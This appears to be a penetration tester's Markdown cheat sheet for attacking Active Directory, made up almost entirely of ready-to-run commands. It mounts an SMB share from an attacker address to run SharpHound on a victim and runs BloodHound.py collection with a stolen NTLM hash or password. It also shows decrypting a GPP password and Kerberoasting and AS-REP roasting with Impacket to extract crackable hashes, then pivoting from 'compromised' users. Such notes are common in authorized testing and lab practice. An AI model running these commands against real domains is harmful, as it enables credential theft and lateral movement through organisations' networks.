# Active Directory

## Bloodhound

```
impacket-smbserver share . -smb2support -username df -password df
net use \\10.10.14.9\share /u:df df
cd \\10.10.14.9\share\
.\SharpHound.exe
```

## Bloodhound-Python

{% embed url="https://github.com/fox-it/BloodHound.py" %}

You can use the python script in replacement of executing sharphound. Run `neo4j console` and `bloodhound`. Drag and drop the `.json` files to bloodhound, then mark a user/users you've compromised and use the `Analysis` tab to see where your next pivoting target is

### w/ hash

```python
python3 bloodhound.py -ns nameserver/dc ip 10.11.1.20 -d domain.local -u Administrator --hashes ntlm -c All
```

### w/ password

```python
python3 bloodhound.py -ns <DC IP> -d <domain> -u <username> -p <password> -c All
```

## Decrypting GPP Password

```
gpp-decrypt asdlkfjOLKAjlksdf/DLkjslkjf;lkj234lkasd0+
```

## Impacket Stuff

### Kerberoasting

```
impacket-GetUserSPNs test.local/john:password123 -dc-ip 10.10.10.1 -request
```

### AS-REP Roasting

```
impacket-GetNPUsers -no-pass -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst
impacket-GetNPUsers -no-pass -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst | grep krb5asrep
```

## Listing directories in PowerShell

```
Get-ChildItem . -Force
dir -Force
ls -Force
gci -Force
```
